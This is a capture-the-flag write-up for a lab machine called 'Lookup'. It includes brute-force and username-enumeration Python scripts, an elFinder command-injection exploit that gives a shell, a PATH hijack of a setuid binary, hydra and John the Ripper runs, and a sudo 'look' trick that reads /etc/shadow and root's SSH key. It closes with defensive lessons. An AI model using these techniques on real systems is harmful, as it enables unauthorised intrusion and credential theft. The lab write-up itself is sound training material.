# MACHINE DETAILS

**Machine Name:** [Lookup]
**IP:** `10.65.149.49`
**OS:** [Linux]
**Objective:** [Root/User Flag]

# RECONNAISSANCE

- I enumerated services with **nmap** and found SSH and HTTP ports open

  ```bash
  nmap -sV -p- -T4 -Pn -v -oN scan lookup.thm
  ```

  **Services found**

  ```text
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  ```

- The homepage shows a login page. I attempted to login with a few common default
default credentials and noticed a few unusual things.
  - The `admin` account shows a different error message from the other accounts I
  attempted
  - Login forms have a hidden input field to prevent CRSF. This form doesn't.
- I enumerated directories with **gobuster** and found nothing I could use.

  ```bash
  gobuster dir -u http://lookup.thm -t 30 -w /usr/share/wordlists/dirb/big.txt 
  ```

- I wrote a crude **python** script to brute force the *admin* account.

  ```python
  import requests 

  password_file = "rockyou.txt"
  account = "admin"
  target = "http://lookup.thm/login.php"

  with open(password_file, 'r') as fh:
      for line in fh:
          passwd = line.strip() 
          payload = {"username": account , "password": passwd}

          req = requests.post(target, data=payload)

          if "Wrong" in req.text: 
              print(f"{passwd} is incorrect")
          else: 
              print(f"SUCCESS. \nUsername: {account} \nPassword: {passwd}")
              # print(req.text)
              break
  ```

- The script was slow. I could have optimized it with multithreading.
- I decided to enumerate user accounts.

  ```python
    import requests

  URL = 'http://lookup.thm/login.php'

  with open('/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt', 'r') as fh:
      usernames = fh.readlines()

      valid_users = []
      payload = {'username': '', 'password': "whatever"}

      for user in usernames:
          payload['username'] = user.strip()
          print(f'Attempting\t{user}')

          req = requests.post(URL, payload)

          if 'Wrong username' not in req.text:
              print(f'FOUND VALID USER: {user}')
              valid_users.append(user)
          print('Found users: ', valid_users)
      print(f'Valid USERS: ', valid_users)
  ```

- I found a second valid account: `jose`

## VULNERABILITIES

- No rate limiting. Password brute forcing possible
- Login form doesn't have CSRF protection
- Username enumeration

# EXPLOITATION

- I used the first script above to brute force the `jose` account
- The script, while broken, found `jose`'s password.
  `jose:P**********`
- I logged in as `jose` and was redirected to `files.lookup.thm`
- `files.lookup.thm` hosts a web file manager.
  - `elFinder Web file manager Version: 2.1.47`
- I looked it up online and found a command injection (CVE-2019-9194) exploit on ExploitDB.

  ```bash
  cp /usr/share/exploitdb/exploits/php/webapps/46481.py exploit.py
  python2 exploit.py http://files.lookup.thm/elFinder
  [*] Uploading the malicious image...
  [*] Running the payload...
  [+] Pwned! :)
  [+] Getting the shell...
  $ id 
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

- I got a shell.
- the user flag is in the account `think` home directory.

## HORIZONTAL PRIVILEGE ESCALATION

- I found a setuid process that could help me escalate to other users.

  ```bash
  find / -type f -perm -04000 2>/dev/null 
  ```

- The `/usr/sbin/pwm` is an unusual ELF binary.
  - I ran `strings` on it to see if I could find anything that explains how it works.

  ```text
  []A\A]A^A_
  [!] Running 'id' command to extract the username and user ID (UID)
  [-] Error executing id command
  uid=%*u(%[^)])
  [-] Error reading username from id command
  [!] ID: %s
  /home/%s/.passwords
  [-] File /home/%s/.passwords not found
  :*3$"
  GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
  crtstuff.c
  ```

  - `pwm` extracts from the output of the `id` command the username and reads
  a `.passwords` file in the user's home directory.
  - I can hijack the path with my own version of the `id` command.

  ```bash
  cd /tmp 
  cat > id <<EOF 
  #!/bin/bash 
  echo "uid=1000(think) gid=1000(think) groups=1000(think)"
  EOF 
  chmod +x id 

  PATH=/tmp:$PATH /usr/sbin/pwm 
  ```

  - I attempted this with the root account, but root doesn't have a *.passwords* file.
  - `pwm` outputs a list passwords `think` has used. Luckily, one is current.

  ```bash
  www-data@ip-10-65-149-49:/tmp$ PATH=/tmp:$PATH /usr/sbin/pwm 
  PATH=/tmp:$PATH /usr/sbin/pwm 
  [!] Running 'id' command to extract the username and user ID (UID)
  [!] ID: think
  jose1006
  jose1004
  jose1002
  jose1001teles
  ...
  ```

  - I copied the passwords to a file on the attack box and launched **hydra**
  targeting `think` over SSH.

  ```bash
   hydra -l think -P passwords.txt ssh://lookup.thm                        
    Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-19 20:09:08
    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
    [DATA] attacking ssh://lookup.thm:22/
    [22][ssh] host: lookup.thm   login: think   password: **********
    1 of 1 target successfully completed, 1 valid password found
    [WARNING] Writing restore file because 1 final worker threads did not complete until end.
    [ERROR] 1 target did not resolve or could not be connected
    [ERROR] 0 target did not complete
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-19 20:09:13
  ```

  - With `think` credentials, I SSHed in and got the `user flag`.

  ```bash
  think@ip-10-65-149-49:~$ ls
  user.txt
  think@ip-10-65-149-49:~$ cat user.txt 
  ********************************
  ```

## VERTICAL PRIVILEGE ESCALATION

- I started by testing common privilege escalation vectors.
- `think` can run `/usr/bin/look` with elevated privileges

  ```bash
  think@ip-10-65-149-49:/tmp$ sudo -l 
  Matching Defaults entries for think on ip-10-65-149-49:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User think may run the following commands on ip-10-65-149-49:
      (ALL) /usr/bin/look
  think@ip-10-65-149-49:/tmp$
  ```

- Apparently, `look` is used to read files. So, I extracted `/etc/shadow` to attempt
to brute force the `root` account.

  ```bash
  think@ip-10-65-149-49:/tmp$ look 
  usage: look [-bdf] [-t char] string [file ...]
  think@ip-10-65-149-49:/tmp$ sudo look '' /etc/shadow
  root:$6$*******************************************************************************************************:19855:0:99999:7:::
  daemon:*:19046:0:99999:7:::
  bin:*:19046:0:99999:7:::
  sys:*:19046:0:99999:7:::
  sync:*:19046:0:99999:7:::
  games:*:19046:0:99999:7:::
  man:*:19046:0:99999:7:::
  lp:*:19046:0:99999:7:::
  mail:*:19046:0:99999:7:::
  news:*:19046:0:99999:7:::
  ...
  ```

  - On the attack box, I ran `John`.

  ```bash
  unshadow extracted_passwd extracted_shadow > combined.txt
  john --single combined.txt 
  Using default input encoding: UTF-8
  Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
  Cost 1 (iteration count) is 5000 for all loaded hashes
  Will run 12 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  Warning: Only 2 candidates buffered for the current salt, minimum 24 needed for performance.
  Warning: Only 16 candidates buffered for the current salt, minimum 24 needed for performance.
  Almost done: Processing the remaining buffered candidate passwords, if any.
  0g 0:00:00:02 DONE (2026-03-19 20:41) 0g/s 811.4p/s 822.8c/s 822.8C/s think1923..think1900
  Session completed. 
  ```

  - I couldn't crack the `root` account password. Instead of looking for a better
  wordlist, I tried to read the `root` account private SSH key.

  ```bash
  think@ip-10-65-149-49:/tmp$ sudo look '' /root/.ssh/id_rsa
  -----BEGIN OPENSSH PRIVATE KEY-----
  b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
  ```

  - Yay! With the `root` user SSH private key, I logged in and got the root flag!

  ```bash
  chmod 400 extracted_id_rsa 
  ssh -i extracted_id_rsa root@lookup.thm 
  root@ip-10-65-149-49:~# cat root.txt
  ********************************
  root@ip-10-65-149-49:~#
  ```

# TOOLS

- **Nmap**
- **Burp**
- **Gobuster**
- **Python**
- **Hydra**
- **John The Ripper**

# LESSONS LEARNED

- Carefully look at server responses. What you find might surprise you!
- To prevent user enumeration, it is better to return a generic error
message for existing and non-existing accounts.
- Also, MFA and account-based rate limiting would have helped secure
the accounts breached.
- Secure coding is an absolute imperative. I was able to pivot to the `think`
user because of an oversight/bug in `pwm`. `pwm` relied on the shell to
correctly identify the `id` program which it calls using its relative path. This bug is
solved by always using ***absolute paths*** instead of relative ones.
Or at least ensure there is no ambiguity or confusion if relative paths must be used.
- Lastly, I gained *root* access by exploiting a permission misconfiguration. It is
important to follow **Principle of Least Privilege** when configuring user
permissions.
